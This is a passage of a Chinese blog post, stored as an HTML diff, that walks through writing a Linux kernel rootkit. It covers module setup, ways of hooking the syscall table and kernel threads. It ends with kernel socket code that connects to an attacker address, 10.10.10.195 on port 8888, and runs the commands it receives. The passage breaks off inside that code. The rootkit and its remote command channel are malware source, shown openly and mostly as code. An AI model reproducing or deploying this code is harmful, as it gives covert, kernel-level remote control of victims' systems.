@@ -1,0 +1,562 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"windy-purple.github.io","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="一、前言   linux kernel rootkit跟普通的应用层rootkit个人感觉不大，个人感觉区别在于一个运行在用户空间中，一个运行在内核空间中；另一个则是编写时调用的API跟应用层rootkit不同      一个最简单的linux kernel rootkit就是一个linux kernel module      PS：如有错误，请斧正  二、环境内核版本：5.4.0-120 攻击">
+<meta property="og:type" content="article">
+<meta property="og:title" content="编写一个简单的linux kernel rootkit">
+<meta property="og:url" content="https://windy-purple.github.io/2022/08/08/15/index.html">
+<meta property="og:site_name" content="windy_ll">
+<meta property="og:description" content="一、前言   linux kernel rootkit跟普通的应用层rootkit个人感觉不大，个人感觉区别在于一个运行在用户空间中，一个运行在内核空间中；另一个则是编写时调用的API跟应用层rootkit不同      一个最简单的linux kernel rootkit就是一个linux kernel module      PS：如有错误，请斧正  二、环境内核版本：5.4.0-120 攻击">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/windy-purple/blog_picture_bed//linux_kernel_rootkit/1.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/windy-purple/blog_picture_bed//linux_kernel_rootkit/2.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/windy-purple/blog_picture_bed//linux_kernel_rootkit/3.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/windy-purple/blog_picture_bed//linux_kernel_rootkit/4.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/windy-purple/blog_picture_bed//linux_kernel_rootkit/5.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/windy-purple/blog_picture_bed//linux_kernel_rootkit/6.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/windy-purple/blog_picture_bed//linux_kernel_rootkit/7.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/windy-purple/blog_picture_bed//linux_kernel_rootkit/8.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/windy-purple/blog_picture_bed//linux_kernel_rootkit/9.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/windy-purple/blog_picture_bed//linux_kernel_rootkit/10.png">
+<meta property="article:published_time" content="2022-08-07T16:21:15.000Z">
+<meta property="article:modified_time" content="2024-11-12T15:14:22.573Z">
+<meta property="article:author" content="windy_ll">
+<meta property="article:tag" content="linux">
+<meta property="article:tag" content="kernel">
+<meta property="article:tag" content="rootkit">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/windy-purple/blog_picture_bed//linux_kernel_rootkit/1.png">
+
+<link rel="canonical" href="https://windy-purple.github.io/2022/08/08/15/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>编写一个简单的linux kernel rootkit | windy_ll</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">windy_ll</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://windy-purple.github.io/2022/08/08/15/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="windy_ll">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="windy_ll">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          编写一个简单的linux kernel rootkit
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-08-08 00:21:15" itemprop="dateCreated datePublished" datetime="2022-08-08T00:21:15+08:00">2022-08-08</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2024-11-12 23:14:22" itemprop="dateModified" datetime="2024-11-12T23:14:22+08:00">2024-11-12</time>
+              </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>11k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>21 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h1><p>   <strong>linux kernel rootkit跟普通的应用层rootkit个人感觉不大，个人感觉区别在于一个运行在用户空间中，一个运行在内核空间中；另一个则是编写时调用的API跟应用层rootkit不同</strong>  </p>
+<p>   <strong>一个最简单的linux kernel rootkit就是一个linux kernel module</strong>  </p>
+<p>   <strong>PS：如有错误，请斧正</strong></p>
+<hr>
+<h1 id="二、环境"><a href="#二、环境" class="headerlink" title="二、环境"></a>二、环境</h1><pre><code>内核版本：5.4.0-120
+攻击机：kal
+靶机和编译机：ubuntu18 64位
+</code></pre>
+<hr>
+<h1 id="三、linux-kernel-module"><a href="#三、linux-kernel-module" class="headerlink" title="三、linux kernel module"></a>三、linux kernel module</h1><p>   <strong>PS: linux kernel module编写网上资料很多，这里不在过多叙述</strong>  </p>
+<p>   <strong>1、一个linux kernel module必备的函数为<code>module_init</code>和<code>module_exit</code>，前者为linux kernel module加载时调用的函数，后者为linux kernel module卸载时调用的函数，如下所示：</strong>  </p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">module_init(rootkit_init);</span><br><span class="line">module_exit(rootkit_exit);</span><br></pre></td></tr></table></figure>
+
+<p>   <strong>2、当然，也有其他<code>module</code>开头的函数，例如<code>ODULE_AUTHOR</code>声明作者等函数，但这些都是可选的</strong>  </p>
+<p>   <strong>3、linux kernel module打印函数也跟用户态的<code>printf</code>函数不同，为<code>printk</code>函数，当然，也不会打印在终端中，通过<code>printk</code>打印的信息可通过<code>dmesg</code>命令查看</strong>  </p>
+<p>   <strong>4、一个最简单的linux kernel module如下所示，其中<code>module_init</code>声明了模块加载时的函数<code>example_init</code>，<code>module_exit</code>声明了模块卸载时调用的函数函数<code>example_exit</code>，这个最简单的linux kernel module实现的功能就是在加载时和卸载时打印字符串</strong>  </p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br><span class="line">MODULE_AUTHOR(<span class="string">&quot;windy_ll&quot;</span>);</span><br><span class="line">MODULE_DESCRIPTION(<span class="string">&quot;Basic Kernel Module&quot;</span>);</span><br><span class="line">MODULE_VERSION(<span class="string">&quot;0.01&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> __init <span class="title function_">example_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;Hello, world!\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> __exit <span class="title function_">example_exit</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    printk(KERN_INFO <span class="string">&quot;Goodbye, world!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(example_init);</span><br><span class="line">module_exit(example_exit);</span><br></pre></td></tr></table></figure>
+
+<p>   <strong>5、linux kernel module可通过<code>make modules</code>命令编译，例如本篇编译的<code>Makefile</code>文件如下所示：</strong>  </p>
+<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">obj-m += rootkit.o</span><br><span class="line"></span><br><span class="line"><span class="section">all:</span></span><br><span class="line">	make -C /lib/modules/<span class="variable">$(<span class="built_in">shell</span> uname -r)</span>/build M=<span class="variable">$(PWD)</span> modules</span><br><span class="line"></span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">	make -C /lib/modules/<span class="variable">$(<span class="built_in">shell</span> uname -r)</span>/build M=<span class="variable">$(PWD)</span> clean</span><br></pre></td></tr></table></figure>
+
+<p>   <strong>5、linux kernel module使用命令<code>insmod</code>加载，使用<code>rmmod</code>命令卸载，可以使用<code>lsmod</code>命令查看所有已经加载的linux kernel module。上面的linux kernel module运行结果如下图所示：</strong>  </p>
+<p><img src="https://cdn.jsdelivr.net/gh/windy-purple/blog_picture_bed//linux_kernel_rootkit/1.png">  </p>
+<p><img src="https://cdn.jsdelivr.net/gh/windy-purple/blog_picture_bed//linux_kernel_rootkit/2.png">  </p>
+<p><img src="https://cdn.jsdelivr.net/gh/windy-purple/blog_picture_bed//linux_kernel_rootkit/3.png">  </p>
+<hr>
+<h1 id="四、hook系统调用表"><a href="#四、hook系统调用表" class="headerlink" title="四、hook系统调用表"></a>四、hook系统调用表</h1><p>   <strong>1、系统调用表（System call Table），是一张由指向实现各种系统调用的内核函数的函数指针组成的表，该表可以基于系统调用编号进行索引，来定位函数地址，完成系统调用(PS: 来自百度百科)，系统调用表详细列表如下链接所示：</strong>  </p>
+<p><a target="_blank" rel="noopener" href="https://github.com/torvalds/linux/blob/master/arch/x86/entry/syscalls/syscall_64.tbl">https://github.com/torvalds/linux/blob/master/arch/x86/entry/syscalls/syscall_64.tbl</a></p>
+<p>   <strong>2、系统调用表的hook一般可以通过以下几种方式来实现：</strong>  </p>
+<ul>
+<li><p>找到系统调用表位置，修改系统调用表中的函数地址</p>
+</li>
+<li><p>找到系统调用表位置，修改系统调用表函数前几个字节做一个jmp，就是inlinehook，当然可以在汇编上直接替换掉系统调用表的函数二进制指令</p>
+</li>
+<li><p>利用别人写好的框架，例如ftrace(PS:本文为了方便，即利用此方式)</p>
+<p> <strong>3、获取系统调用表地址一般也可以通过以下几种方式来实现</strong>  </p>
+</li>
+<li><p>通过调用函数kallsyms_lookup_name获取(ps:高版本已经被禁用该函数)</p>
+</li>
+<li><p>扫描内存，匹配特征码来找到系统调用表的地址</p>
+</li>
+<li><p>读取&#x2F;proc&#x2F;kallsym文件来获取</p>
+</li>
+<li><p>其他方法，不在过多介绍</p>
+<p> <strong>4、linux kernel rootkit中的某些功能需要通过hook系统调用表的函数来实现，例如监控命令的执行等</strong></p>
+</li>
+</ul>
+<hr>
+<h1 id="五、linux-kernel多线程"><a href="#五、linux-kernel多线程" class="headerlink" title="五、linux kernel多线程"></a>五、linux kernel多线程</h1><p>   <strong>1、linux kernel中的多线程可使用宏定义<code>kthread_run</code>来创建一个内核线程，第一个参数为线程要执行的函数名，使用<code>kthread_stop</code>来停止</strong>  </p>
+<p>   <strong>2、一个简单的多线程示例如下所示：(PS: 这里不用导入那么多头文件，之所以使用这么多头文件，是使用了其他API)</strong>  </p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/kthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/delay.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/syscalls.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/version.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/namei.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/moduleparam.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/fs.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/uaccess.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">test_kthread</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line"> </span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">kthread_test_func</span><span class="params">(<span class="type">void</span> *data)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">static</span> __init <span class="type">int</span> <span class="title function_">kthread_test_init</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	test_kthread = kthread_run(kthread_test_func, <span class="literal">NULL</span>, <span class="string">&quot;kthread-test&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (!test_kthread) &#123;</span><br><span class="line">		<span class="keyword">return</span> -ECHILD;</span><br><span class="line">	&#125;</span><br><span class="line"> </span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="type">static</span> __exit <span class="type">void</span> <span class="title function_">kthread_test_exit</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">module_init(kthread_test_init);</span><br><span class="line">module_exit(kthread_test_exit);</span><br></pre></td></tr></table></figure>
+
+<h1 id="六、linux-kernel-socket"><a href="#六、linux-kernel-socket" class="headerlink" title="六、linux kernel socket"></a>六、linux kernel socket</h1><p>   <strong>1、linux内核中的通信和用户层面的步骤差不多，都是先创建socket、连接或监听socket、调用函数收发信息、关闭连接</strong>  </p>
+<p>   <strong>2、不同点在于调用的API不同，linux内核中调用的是<code>sock_create_kern</code>函数来创建socket，调用<code>sock-&gt;ops-&gt;connect</code>来连接服务端(PS:这里的sock是前面创建的socket连接符)，调用<code>kernel_sendmsg</code>来发送信息，调用<code>kernel_recvmsg</code>来接收信息，调用<code>kernel_sock_shutdown</code>函数来关闭连接，调用<code>sock_release</code>函数来释放socket连接符，按照用户层的socket的流程来调用即可</strong>  </p>
+<p>   <strong>3、上面的api不是唯一的，linux源码中还提供了其他的函数来实现socket连接，感兴趣的可以去查阅相关的linux源码</strong>  </p>
+<p>   <strong>4、上面只写了socket客户端，不写socket服务端的原因是作者测试了好几套api在5.4的内核版本中，都运行到某个阶段内核就挂了，知道原因的大佬可以指出是什么原因</strong>  </p>
+<p>   <strong>5、测试用例如下所示：</strong></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">myserver</span><span class="params">(<span class="type">void</span> *data)</span>&#123;</span><br><span class="line"> </span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">socket</span> *<span class="title">sock</span>,*<span class="title">client_sock</span>;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">s_addr</span>;</span></span><br><span class="line">        <span class="type">unsigned</span> <span class="type">short</span> portnum=<span class="number">8888</span>;</span><br><span class="line">        <span class="type">int</span> ret=<span class="number">0</span>;</span><br><span class="line">        <span class="type">char</span> recvbuf[<span class="number">1024</span>];</span><br><span class="line">	<span class="type">char</span> sendbuf[<span class="number">4096</span>];</span><br><span class="line">	<span class="type">char</span> *result;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">msghdr</span> <span class="title">recvmsg</span>,<span class="title">sendmsg</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kvec</span> <span class="title">send_vec</span>,<span class="title">recv_vec</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//sendbuf = kmalloc(1024,GFP_KERNEL);</span></span><br><span class="line">	<span class="keyword">if</span>(sendbuf == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		printk(KERN_INFO <span class="string">&quot;[SockTest]: sendbuf kmalloc failed!\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//recvbuf = kmalloc(1024,GFP_KERNEL);</span></span><br><span class="line">	<span class="keyword">if</span>(recvbuf == <span class="literal">NULL</span>) &#123;</span><br><span class="line">		printk(KERN_INFO <span class="string">&quot;[SockTest]: recvbuf kmalloc failed!\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line"> </span><br><span class="line">        <span class="built_in">memset</span>(&amp;s_addr,<span class="number">0</span>,<span class="keyword">sizeof</span>(s_addr));</span><br><span class="line">        s_addr.sin_family=AF_INET;</span><br><span class="line">        s_addr.sin_port=htons(portnum);</span><br><span class="line">        s_addr.sin_addr.s_addr=in_aton(<span class="string">&quot;10.10.10.195&quot;</span>);</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">        sock=(<span class="keyword">struct</span> socket *)kmalloc(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> socket),GFP_KERNEL);</span><br><span class="line">        client_sock=(<span class="keyword">struct</span> socket *)kmalloc(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> socket),GFP_KERNEL);</span><br><span class="line"> </span><br><span class="line">        <span class="comment">/*create a socket*/</span></span><br><span class="line">        ret=sock_create_kern(&amp;init_net,AF_INET, SOCK_STREAM,<span class="number">0</span>,&amp;sock);</span><br><span class="line">        <span class="keyword">if</span>(ret &lt; <span class="number">0</span>)&#123;</span><br><span class="line">                printk(<span class="string">&quot;[SockTest]:socket_create_kern error!\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        printk(<span class="string">&quot;[SockTest]:socket_create_kern ok!\n&quot;</span>);</span><br><span class="line"> </span><br><span class="line">        <span class="comment">/*connect the socket*/</span></span><br><span class="line">        ret=sock-&gt;ops-&gt;connect(sock,(<span class="keyword">struct</span> sockaddr *)&amp;s_addr,<span class="keyword">sizeof</span>(s_addr),<span class="number">0</span>);</span><br><span class="line">	printk(KERN_INFO <span class="string">&quot;[SockTest]: connect ret = %d\n&quot;</span>,ret);</span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">        if(ret != 0)&#123;</span></span><br><span class="line"><span class="comment">                printk(&quot;[SockTest]: connect error\n&quot;);</span></span><br><span class="line"><span class="comment">                return ret;</span></span><br><span class="line"><span class="comment">        &#125;</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">        printk(<span class="string">&quot;[SockTest]:connect ok!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">memset</span>(sendbuf,<span class="number">0</span>,<span class="number">1024</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">strcpy</span>(sendbuf,<span class="string">&quot;test&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">memset</span>(&amp;sendmsg,<span class="number">0</span>,<span class="keyword">sizeof</span>(sendmsg));</span><br><span class="line">	<span class="built_in">memset</span>(&amp;send_vec,<span class="number">0</span>,<span class="keyword">sizeof</span>(send_vec));</span><br><span class="line"></span><br><span class="line">	send_vec.iov_base = sendbuf;</span><br><span class="line">	send_vec.iov_len = <span class="number">4096</span>;	</span><br><span class="line">	</span><br><span class="line">        <span class="comment">/*send*/</span></span><br><span class="line">	ret = kernel_sendmsg(sock,&amp;sendmsg,&amp;send_vec,<span class="number">1</span>,<span class="number">4</span>);</span><br><span class="line">	printk(KERN_INFO <span class="string">&quot;[SockTest]: kernel_sendmsg ret = %d\n&quot;</span>,ret);</span><br><span class="line">	<span class="keyword">if</span>(ret &lt; <span class="number">0</span>) &#123;</span><br><span class="line">		printk(KERN_INFO <span class="string">&quot;[SockTest]: kernel_sendmsg failed!\n&quot;</span>);</span><br><span class="line">		<span class="keyword">return</span> ret;</span><br><span class="line">	&#125;</span><br><span class="line">	printk(KERN_INFO <span class="string">&quot;[SockTest]: send ok!\n&quot;</span>);</span><br><span class="line">	<span class="built_in">memset</span>(&amp;recv_vec,<span class="number">0</span>,<span class="keyword">sizeof</span>(recv_vec));</span><br><span class="line">	<span class="built_in">memset</span>(&amp;recvmsg,<span class="number">0</span>,<span class="keyword">sizeof</span>(recvmsg));</span><br><span class="line"></span><br><span class="line">	recv_vec.iov_base = recvbuf;</span><br><span class="line">	recv_vec.iov_len = <span class="number">1024</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="comment">/*kmalloc a receive buffer*/</span></span><br><span class="line">	<span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span><br><span class="line">		<span class="built_in">memset</span>(recvbuf, <span class="number">0</span>, <span class="number">1024</span>);</span><br><span class="line"></span><br><span class="line">		ret = kernel_recvmsg(sock,&amp;recvmsg,&amp;recv_vec,<span class="number">1</span>,<span class="number">1024</span>,<span class="number">0</span>);</span><br><span class="line">		printk(KERN_INFO <span class="string">&quot;[SockTest]: received message: %s\n&quot;</span>,recvbuf);</span><br><span class="line">		<span class="keyword">if</span>(!<span class="built_in">strcmp</span>(<span class="string">&quot;exit&quot;</span>,recvbuf)) &#123;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		printk(KERN_INFO <span class="string">&quot;[SockTest]: %ld\n&quot;</span>,<span class="built_in">strlen</span>(recvbuf));</span><br><span class="line">		result = execcmd(recvbuf);</span><br><span class="line">		<span 